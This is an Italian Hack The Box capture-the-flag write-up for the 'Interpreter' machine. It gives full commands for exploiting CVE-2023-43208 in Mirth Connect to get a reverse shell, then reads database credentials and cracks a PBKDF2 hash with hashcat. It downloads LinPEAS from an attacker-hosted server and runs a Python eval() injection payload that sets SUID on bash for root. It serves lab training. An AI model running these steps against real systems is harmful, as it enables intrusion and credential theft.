# Writeup: Interpreter — Hack The Box (Medium)

## Indice

1. Ricognizione
2. Enumerazione Web
3. Foothold — CVE-2023-43208
4. Post-Exploitation Enumeration
5. Lateral Movement — Credenziali DB e cracking hash
6. Privilege Escalation — notif.py SSTI
7. Shell root

---

## 1. Ricognizione

Aggiungiamo il target al file `/etc/hosts`:

```bash
echo "10.129.244.184 interpreter.htb" | sudo tee -a /etc/hosts
```

Eseguiamo una scansione veloce su tutte le porte, seguita da un'analisi approfondita dei servizi trovati:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.184 -oG porte
sudo nmap -sC -sV -O -p22,80,443,6661 10.129.244.184 -oN servizi
```

**Risultati:**

| Porta | Servizio | Versione                            |
| ----- | -------- | ----------------------------------- |
| 22    | SSH      | OpenSSH 9.2p1 Debian                |
| 80    | HTTP     | Jetty — Mirth Connect Administrator |
| 443   | HTTPS    | Jetty — Mirth Connect Administrator |
| 6661  | Unknown  | —                                   |

Il TTL 63 conferma un sistema Linux a 2 hop di distanza. Il certificato SSL ha CN `mirth-connect`. Nmap risolve l'IP come `interpreter.htb`.

---

## 2. Enumerazione Web

L'HTTP title `Mirth Connect Administrator` identifica immediatamente il software in esecuzione. **Mirth Connect** è un integration engine open source per il settore healthcare (HL7), sviluppato da NextGen Healthcare.

Enumeriamo gli endpoint con gobuster:

```bash
gobuster dir -u http://interpreter.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

Tra i risultati troviamo l'end point `webstart`  dove è presente il file `/webstart.jnlp`. Questo file JNLP è usato dall'Administrator Launcher per connettersi al server e contiene la versione in chiaro:

```bash
curl -sk https://interpreter.htb/webstart.jnlp | grep version
```

Il file `webstart.jnlp` lo troviamo anche visitando il sito html e cliccando su **Launch Mirth Connect Administrator** che ci consente di scaricarlo.

**Versione confermata: Mirth Connect 4.4.0**

---

## 3. Foothold — CVE-2023-43208

Mirth Connect 4.4.0 è vulnerabile a **CVE-2023-43208**, un RCE pre-autenticato con CVSS 9.8 che sfrutta una deserializzazione Java non sicura. Colpisce tutte le versioni precedenti alla 4.4.1.

Cloniamo il PoC pubblico disponibile su GitHub:

```bash
git clone https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208
cd Mirth-Connect-CVE-2023-43208
```

Mettiamo in ascolto un listener sulla nostra macchina:

```bash
nc -lvnp 4444
```

Lanciamo l'exploit:

```bash
python3 mirth_rce.py https://interpreter.htb 10.10.15.219 4444
```

Otteniamo una shell come utente `mirth` nella directory `/usr/local/mirthconnect`.

Miglioriamo la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Post-Exploitation Enumeration

La prima cosa da fare dopo aver ottenuto la shell è orientarsi nel sistema.

```bash
id
# uid=103(mirth) gid=111(mirth) groups=111(mirth)

cat /etc/passwd | grep -v nologin | grep -v false
# root, sedric — utente reale con shell
```

Essendo atterrati nella directory di installazione di Mirth Connect, esploriamo la struttura alla ricerca di credenziali:

```bash
ls -la /usr/local/mirthconnect/conf/
cat /usr/local/mirthconnect/conf/mirth.properties | grep -i "pass\|user\|db"
```

Il file rivela le credenziali del database in chiaro:

```
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

---

## 5. Lateral Movement — Credenziali DB e cracking hash

Ci connettiamo al database MariaDB con le credenziali trovate:

```bash
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
```

Esploriamo progressivamente il database:

```sql
SHOW DATABASES;
USE mc_bdd_prod;
SHOW TABLES;
SELECT * FROM PERSON;
SELECT * FROM PERSON_PASSWORD;
```

Troviamo l'hash della password dell'utente `sedric`:

```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

### Identificazione del formato hash

La stringa presenta i caratteri tipici del **Base64** — alfabeto alfanumerico, simboli `+` e `/`, e padding `==` finale. La decodifichiamo per analizzare i byte raw:

```bash
echo "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==" | base64 -d | wc -c
# 40 byte
```

40 byte non corrisponde a nessun algoritmo standard comune (SHA-1=20, SHA-256=32, SHA-512=64). Dalla documentazione open source di Mirth Connect apprendiamo che dalla versione 4.4.0 viene usato **PBKDF2WithHmacSHA256** con 600.000 iterazioni, dove i primi 8 byte sono il salt e i restanti 32 sono l'hash derivato (8+32=40 ✓).

Verifichiamo ed estraiamo salt e hash:

```bash
python3 -c "
import base64
raw = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
print(f'Salt (8B) : {raw[:8].hex()}')
print(f'Hash (32B): {raw[8:].hex()}')
"
```

### Cracking con hashcat

Costruiamo la stringa nel formato hashcat (`-m 10900` = PBKDF2-HMAC-SHA256):

```bash
python3 -c "
import base64
raw = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt_b64 = base64.b64encode(raw[:8]).decode()
hash_b64 = base64.b64encode(raw[8:]).decode()
print(f'sha256:600000:{salt_b64}:{hash_b64}')
"
# sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

Cracchiamo la password con **hashcat**

```bash
echo "sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=" > hash.txt
hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Password trovata: `snowflake1`**

```bash
su sedric
# password: snowflake1
cat /home/sedric/user.txt
```

🎉 **User flag ottenuta!**

---

## 6. Privilege Escalation — notif.py SSTI

Carichiamo ed eseguiamo **LinPEAS** per una enumerazione sistematica:

```bash
# Sulla nostra macchina
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8080

# Sulla macchina target
wget http://<NOSTRO_IP>:8080/linpeas.sh
bash linpeas.sh
```

LinPEAS evidenzia subito nella sezione **"Readable files belonging to root and readable by me but not world readable"**:

```
-rwxr----- 1 root sedric 2332 Sep 19 2025 /usr/local/bin/notif.py
```

Un file eseguibile di root leggibile da `sedric` . Incrociando con `ps auxf | grep "root"` (processo root) e `ss -tlnp` (porta 54321 su localhost), il quadro è chiaro: **notif.py** è un file di root che può essere letto dall'utente **sedric**

Da `sedric` leggiamo il sorgente:

```bash
cat /usr/local/bin/notif.py
```

### Analisi del codice

`notif.py` è un microservizio Flask custom che funge da bridge tra Mirth Connect e il filesystem locale. Riceve dati paziente in formato XML e li salva come notifiche in `/var/secure-health/patients/`. Gira come root su `localhost:54321` e accetta solo connessioni locali.

**La vulnerabilità si trova nella funzione `template()`:**

```python
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
# ...
template = f"Patient {first} {last} ..."
return eval(f"f'''{template}'''")
```

Il codice costruisce una f-string inserendo i campi utente direttamente, poi la valuta con `eval()`. Nonostante il commento nel codice affermi di usare "a safe templating function", l'uso di `eval()` su input utente è intrinsecamente vulnerabile.

Il regex permette i caratteri `{`, `}`, `/`, `.`, `(`, `)` — sufficienti per costruire espressioni Python arbitrarie. Il campo `firstname` è il vettore ideale perché, a differenza di `birth_date`, non ha validazioni aggiuntive sull'anno.

---

## 7. Shell root

Poiché il payload non può contenere spazi (bloccati dal regex), usiamo una strategia in due passi.

**Passo 1** — Creiamo uno script che imposta il bit SUID su bash:

```bash
echo '#!/bin/bash' > /tmp/pwn.sh
echo 'chmod u+s /bin/bash' >> /tmp/pwn.sh
chmod +x /tmp/pwn.sh
```

**Passo 2** — Eseguiamo lo script tramite la SSTI di notif.py:

```bash
wget -q -O- \
  --post-data='<patient><firstname>{__import__("os").system("/tmp/pwn.sh")}</firstname><lastname>test</lastname><sender_app>test</sender_app><timestamp>test</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>' \
  --header='Content-Type: application/xml' \
  http://localhost:54321/addPatient
```

Il payload `{__import__("os").system("/tmp/pwn.sh")}` supera il regex (contiene solo caratteri permessi), viene inserito nel template f-string, e `eval()` lo esegue come codice Python con i privilegi di root.

**Passo 3** — Otteniamo la shell root:

```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
```

🎉 **Root flag ottenuta — macchina completata!**

---

## Riepilogo

| Fase                 | Tecnica                        | Dettaglio                                          |
| -------------------- | ------------------------------ | -------------------------------------------------- |
| Foothold             | CVE-2023-43208                 | RCE pre-auth su Mirth Connect 4.4.0                |
| Lateral Movement     | Credenziali DB + hash cracking | PBKDF2WithHmacSHA256, 600k iterazioni, rockyou.txt |
| Privilege Escalation | SSTI via eval()                | notif.py Flask server root su localhost:54321      |

---

*Writeup redatto a fini didattici su macchina Hack The Box autorizzata.*
